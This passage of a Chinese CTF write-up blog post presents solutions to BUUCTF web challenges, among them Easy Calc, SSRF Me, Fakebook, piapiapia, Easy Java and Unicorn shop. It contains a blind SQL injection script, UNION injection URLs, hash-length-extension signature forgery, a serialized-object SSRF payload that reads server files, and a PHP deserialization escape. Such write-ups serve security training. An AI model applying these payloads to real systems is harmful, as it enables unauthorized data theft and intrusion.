+        payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&quot; % (x,mid)
+        data = {&quot;id&quot;:payload}
+        response = requests.post(url,data=data)
+        #print (response.text)
+        if &apos;Hello&apos; in response.text:
+            low = mid + 1
+        else:
+            high = mid
+        mid = (low + high) // 2
+
+    result += chr(int(mid))
+    print(result)
+
+#ascii(substr((select    flag    from    flag),%d,1))&gt;%d</code></pre><p>得到flag<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/32.jpg" alt="32.jpg"></p>
+<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a><strong>[RoarCTF 2019]Easy Calc</strong></h3><p>与国赛love_math相似，只是加了waf<br>提交一些特殊字符的时候会返回403，可以通过http走私漏洞绕过waf。<br>参考：<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a> CL-CL<br>参考国赛payload：base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/33.jpg" alt="33.jpg"></p>
+<h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a><strong>[De1CTF 2019]SSRF Me</strong></h3><p>挺基础的一道web，当时由于Exec函数没整太懂，把题想复杂了，卡了很久。。。<br>题目给了源码如下：</p>
+<pre><code>#! /usr/bin/env python 
+#encoding=utf-8 
+from flask import Flask 
+from flask import request 
+import socket 
+import hashlib 
+import urllib 
+import sys 
+import os 
+import json 
+reload(sys) 
+sys.setdefaultencoding(&apos;latin1&apos;) 
+app = Flask(__name__) 
+secert_key = os.urandom(16) 
+class Task: 
+    def __init__(self, action, param, sign, ip): 
+        self.action = action 
+        self.param = param 
+        self.sign = sign 
+        self.sandbox = md5(ip) 
+        if(not os.path.exists(self.sandbox)): 
+            #SandBox For Remote_Addr 
+            os.mkdir(self.sandbox) 
+    def Exec(self): 
+        result = {} 
+        result[&apos;code&apos;] = 500 
+        if (self.checkSign()): 
+            if &quot;scan&quot; in self.action: 
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;) 
+                resp = scan(self.param) 
+                if (resp == &quot;Connection Timeout&quot;): 
+                    result[&apos;data&apos;] = resp 
+                else: 
+                    print resp 
+                    tmpfile.write(resp) 
+                    tmpfile.close() 
+                result[&apos;code&apos;] = 200 
+            if &quot;read&quot; in self.action: 
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;) 
+                result[&apos;code&apos;] = 200 
+                result[&apos;data&apos;] = f.read() 
+                if result[&apos;code&apos;] == 500: 
+                    result[&apos;data&apos;] = &quot;Action Error&quot; 
+            else: 
+                result[&apos;code&apos;] = 500 
+                result[&apos;msg&apos;] = &quot;Sign Error&quot; 
+            return result 
+    def checkSign(self): 
+        if (getSign(self.action, self.param) == self.sign): 
+            return True 
+        else: 
+            return False 
+#generate Sign For Action Scan. 
+@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;]) 
+def geneSign(): 
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) 
+    action = &quot;scan&quot; 
+    return getSign(action, param) 
+@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;]) 
+def challenge(): 
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;)) 
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) 
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) 
+    ip = request.remote_addr 
+    if(waf(param)): 
+        return &quot;No Hacker!!!!&quot; 
+    task = Task(action, param, sign, ip) 
+    return json.dumps(task.Exec()) 
+@app.route(&apos;/&apos;) 
+def index(): 
+    return open(&quot;code.txt&quot;,&quot;r&quot;).read() 
+def scan(param): 
+    socket.setdefaulttimeout(1) 
+    try: 
+        return urllib.urlopen(param).read()[:50] 
+    except: 
+        return &quot;Connection Timeout&quot; 
+def getSign(action, param): 
+    return hashlib.md5(secert_key + param + action).hexdigest() 
+def md5(content): 
+    return hashlib.md5(content).hexdigest() 
+def waf(param): 
+    check=param.strip().lower() 
+    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): 
+        return True 
+    else: 
+        return False 
+if __name__ == &apos;__main__&apos;: 
+    app.debug = False 
+    app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><p>源码中有三个路由依次分析一下</p>
+<pre><code>#generate Sign For Action Scan. 
+@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;]) 
+def geneSign(): 
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) 
+    action = &quot;scan&quot; 
+    return getSign(action, param) 
+@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;]) 
+def challenge(): 
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;)) 
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) 
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) 
+    ip = request.remote_addr 
+    if(waf(param)): 
+        return &quot;No Hacker!!!!&quot; 
+    task = Task(action, param, sign, ip) 
+    return json.dumps(task.Exec()) 
+@app.route(&apos;/&apos;) 
+def index(): 
+    return open(&quot;code.txt&quot;,&quot;r&quot;).read() </code></pre><p>/geneSign:获取param（这是可控的）和已定义的action调用getSign()生成签名<br>/De1ta:从cookies中获取action和sign，再从输入中获取param和ip，之后调用并返回Exec<br>/:显示网站源码</p>
+<p>再来看一下各个函数</p>
+<pre><code>def Exec(self): 
+    result = {} 
+    result[&apos;code&apos;] = 500 
+    if (self.checkSign()): 
+        if &quot;scan&quot; in self.action: 
+            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;) 
+            resp = scan(self.param) 
+            if (resp == &quot;Connection Timeout&quot;): 
+                result[&apos;data&apos;] = resp 
+            else: 
+                print resp 
+                tmpfile.write(resp) 
+                tmpfile.close() 
+            result[&apos;code&apos;] = 200 
+        if &quot;read&quot; in self.action: 
+            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;) 
+            result[&apos;code&apos;] = 200 
+            result[&apos;data&apos;] = f.read() 
+        if result[&apos;code&apos;] == 500: 
+            result[&apos;data&apos;] = &quot;Action Error&quot; 
+    else: 
+        result[&apos;code&apos;] = 500 
+        result[&apos;msg&apos;] = &quot;Sign Error&quot; 
+    return result</code></pre><p>如果action里有scan，将scan读到的内容写进result.txt，有read，则将result.txt的内容读出来。<br>我当时以为源码只是将result.txt读出来（还是太菜）<br>这样想一下只要将flag.txt写进读出来就可以了<br>这就需要我们伪造签名，再看一下getSign()</p>
+<pre><code>def getSign(action, param): 
+    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>加密了三个变量secert_key,param,action<br>secert_key是固定长度的随机数<br>param可控<br>action在路由/geneSign被定义为scan<br>我们的目标是读取输出flag.txt<br>所以需要构造param为flag.txt,action中包含scan和read<br>两种方法构造<br>（1）哈希长度扩展攻击<br>访问路由/geneSign并get传参param为flag.txt,此时会输出hashlib.md5(secert_key + flag.txt + scan).hexdigest()<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/34.jpg" alt="34.jpg"><br>伪造签名用hashpump工具<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/35.jpg" alt="35.jpg"><br>访问路由/De1ta并get传参param为flag.txt并改cookies<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/36.jpg" alt="36.jpg"><br>(2)字符串拼接<br>访问/geneSign?param=flag.txtread,此时输出hashlib.md5(secert_key + flag.txtread + scan).hexdigest()<br>可以直接实现目标<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/37.jpg" alt="37.jpg"><br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/38.jpg" alt="38.jpg"></p>
+<h3 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a><strong>Fakebook</strong></h3><p>尝试注册admin，成功了（但是并没有什么用）<br>单击用户名跳转到了view.php?no=1考虑注入成功 注入语句<br><a href="http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0" target="_blank" rel="noopener">http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0</a> order by 4<br><a href="http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select" target="_blank" rel="noopener">http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select</a> 1,2,3,4<br><a href="http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select" target="_blank" rel="noopener">http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select</a> 1,database(),3,4<br><a href="http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select" target="_blank" rel="noopener">http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select</a> 1,table_name,3,4 from information_schema.tables where table_schema=database()<br><a href="http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select" target="_blank" rel="noopener">http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select</a> 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’users’ and table_schema=database()<br><a href="http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select" target="_blank" rel="noopener">http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select</a> 1,data,3,4 from fakebook.users<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/39.jpg" alt="39.jpg"><br>发现一个反序列化数据，但是数据本身就是我们注册的并没有什么用<br>最后测试发现源码泄露robots.txt<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/40.jpg" alt="40.jpg"><br>下载审计源码，发现在get()处存在ssrf漏洞</p>
+<pre><code>function get($url)
+{
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $output = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    if($httpCode == 404) {
+        return 404;
+    }
+    curl_close($ch);
+
+    return $output;
+}</code></pre><p>本地测试发现返回了所输入的url的内容<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/41.jpg" alt="41.jpg"><br>结合注入返回结果，可利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。<br>payload：<a href="http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select" target="_blank" rel="noopener">http://343f87fc-54d5-4f23-8cba-dab2b4c32692.node3.buuoj.cn/view.php?no=0/**/union/**/select</a> 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:1;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’<br>因为在注列的时候data列在第四列，所以这里也放在第四列<br>在返回的源码中存在flag<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/42.jpg" alt="42.jpg"></p>
+<h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a><strong>[0CTF 2016]piapiapia</strong></h3><p>源码泄露<a href="http://www.zip下载源码审计" target="_blank" rel="noopener">www.zip下载源码审计</a><br>首先看到了注册的源码，没太大用，但是可以先按规则注册，登陆一波<br>登录之后有一个上传页面<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/43.jpg" alt="43.jpg"><br>继续审查源码发现flag在config中，看到这应该是利用update.php来读取config.php<br>读update.php的源码</p>
+<pre><code>&lt;?php
+    require_once(&apos;class.php&apos;);
+    if($_SESSION[&apos;username&apos;] == null) {
+        die(&apos;Login First&apos;);    
+    }
+    if($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) {
+
+        $username = $_SESSION[&apos;username&apos;];
+        if(!preg_match(&apos;/^\d{11}$/&apos;, $_POST[&apos;phone&apos;]))
+            die(&apos;Invalid phone&apos;);
+
+        if(!preg_match(&apos;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&apos;, $_POST[&apos;email&apos;]))
+            die(&apos;Invalid email&apos;);
+
+        if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)
+            die(&apos;Invalid nickname&apos;);
+
+        $file = $_FILES[&apos;photo&apos;];
+        if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)
+            die(&apos;Photo size error&apos;);
+
+        move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));
+        $profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];
+        $profile[&apos;email&apos;] = $_POST[&apos;email&apos;];
+        $profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];
+        $profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);
+
+        $user-&gt;update_profile($username, serialize($profile));
+        echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;
+    }
+    else {
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+   &lt;title&gt;UPDATE&lt;/title&gt;
+   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;
+   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  
+        &lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; 
+            &lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;
+            &lt;h3&gt;Please Update Your Profile&lt;/h3&gt;
+            &lt;label&gt;Phone:&lt;/label&gt;
+            &lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;
+            &lt;label&gt;Email:&lt;/label&gt;
+            &lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;
+            &lt;label&gt;Nickname:&lt;/label&gt;
+            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;
+            &lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;
+            &lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;
+            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+    }
+?&gt;</code></pre><p>发现了一些正则过滤，在profile.php中发现了读文件的源码，并且会调用class.php中的几个函数进行过滤</p>
+<pre><code>$profile = unserialize($profile);
+$phone = $profile[&apos;phone&apos;];
+$email = $profile[&apos;email&apos;];
+$nickname = $profile[&apos;nickname&apos;];
+$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));
+
+public function show_profile($username) {
+$username = parent::filter($username);
+$where = &quot;username = &apos;$username&apos;&quot;;
+$object = parent::select($this-&gt;table, $where);
+return $object-&gt;profile;
+}
+
+public function filter($string) {
+$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);
+$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;
+#/&apos;|\\/
+$string = preg_replace($escape, &apos;_&apos;, $string);
+$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);
+$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;
+#/select|insert|update|delete|where/i
+return preg_replace($safe, &apos;hacker&apos;, $string);
+}</code></pre><p>如果可以控制’photo’我们就可以读取config.php获得flag<br>另外我们输入的where会被换成hacker，长度变了，但是序列化时长度是不变的<br>如果在nickname后面添上”;}s:5:”photo”;s:10:”config.php共34个字符，然后利用正则替换34个where，这样序列化就会把我们添加的字符挤出去，由于我们构造了闭合后面的upload也就没用了<br>本地测试一下，测试源码</p>
+<pre><code>&lt;?php
+if(!preg_match(&apos;/^\d{11}$/&apos;, $_POST[&apos;phone&apos;]))
+    die(&apos;Invalid phone&apos;);
+
+if(!preg_match(&apos;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&apos;, $_POST[&apos;email&apos;]))
+    die(&apos;Invalid email&apos;);
+
+if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)
+    die(&apos;Invalid nickname&apos;);
+$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];
+$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];
+$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];
+$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($_POST[&apos;name&apos;]);
+echo filter(serialize($profile));
+echo &apos;&lt;br&gt;&apos;;
+var_dump(unserialize(filter(serialize($profile))));
+
+function filter($string) {
+    $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);
+    $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;
+    #/&apos;|\\/
+    $string = preg_replace($escape, &apos;_&apos;, $string);
+    $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);
+    $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;
+    #/select|insert|update|delete|where/i
+    return preg_replace($safe, &apos;hacker&apos;, $string);
+}
+?&gt;</code></pre><p><img src="https://ch3nl3.github.io/2019/11/18/buuctf/44.jpg" alt="44.jpg"><br>可以看到序列化之后photo就受我们控制了<br>接下来在update.php中我们看到nickname有正则过滤限制长度，我们可以用数组绕过<br>用bp抓包构造上传<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/45.jpg" alt="45.jpg"><br>上传成功后查看文件，在源码中有文件base64编码解码获得flag<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/46.jpg" alt="46.jpg"></p>
+<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a><strong>[RoarCTF 2019]Easy Java</strong></h3><p>题目打开为一个登陆界面但是没给注册，<br>进入help发现网址为Download?filename=help.docx<br>考虑任意文件下载，但是返回信息并没有下载<br>bp抓包把请求方式改为post发现可以下载（不知道为什么）<br>题目名为easy java考虑WEB-INF/web.xml泄露<br>下载/WEB-INF/web.xml发现flag根目录<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/51.jpg" alt="51.jpg"><br>下载flag文件  filename=/WEB-INF/classes/com/wm/ctf/FlagController.class<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/52.jpg" alt="52.jpg"><br>WEB-INF/web.xml泄露相关：<br>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：<br>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件</p>
+<h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a><strong>[ASIS 2019]Unicorn shop</strong></h3><p>买独角兽输入购买第四只独角兽发现报错Only one char(?) allowed!<br>源码里有一句提示<meta charset="utf-8"><!--Ah,really important,seriously. --><br>查看资料发现这是utf-8的编码转换问题<br>一个可以查unicode的网站：<a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">https://www.compart.com/en/unicode/</a><br>搜索thousand，随便找一个就可以了<br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/60.jpg" alt="60.jpg"><br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/61.jpg" alt="61.jpg"><br><img src="https://ch3nl3.github.io/2019/11/18/buuctf/62.jpg" alt="62.jpg"><br>更多unicode问题可以参考：<br><a href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener">https://xz.aliyun.com/t/5402</a><br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/" target="_blank" rel="noopener">https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/</a><br><a href="http://unicode.org/reports/tr36/tr36-3.html#Numeric_Spoofs" target="_blank" rel="noopener">http://unicode.org/reports/tr36/tr36-3.html#Numeric_Spoofs</a></p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/11/18/buuctf/">buuctf</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 ch3nl3 的个人博客">ch3nl3</a></p>
+        <p><span>发布时间:</span>2019年11月18日 - 17时06分</p>
+        <p><span>最后更新:</span>2019年12月03日 - 09时26分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/11/18/buuctf/" title="buuctf">http://ch3nl3.github.io/2019/11/18/buuctf/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://ch3nl3.github.io/2019/11/18/buuctf/　　作者: ch3nl3" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2021/03/01/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          第十二届全国大学生信息安全竞赛部分writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/11/14/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9B%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">百度杯CTF比赛 十二月场</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">1.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网杯-2019-随便注"><span class="toc-number">2.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-tornado"><span class="toc-number">3.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">4.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网杯-2019-高明的黑客"><span class="toc-number">5.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">6.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="toc-number">8.</span> <span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">9.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">10.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fakebook"><span class="toc-number">11.</span> <span class="toc-text">Fakebook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">12.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">13.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">14.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+    <style>
+        .toc {
+            white-space: nowrap;
+            overflow-x: hidden;
+        }
+    </style>
+
+    <script>
+        $(document).ready(function() {
+            $(".toc li a").mouseover(function() {
+                var title = $(this).attr('href');
+                $(this).attr("title", title);
+            });
+        })
+    </script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'ch3nl3'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
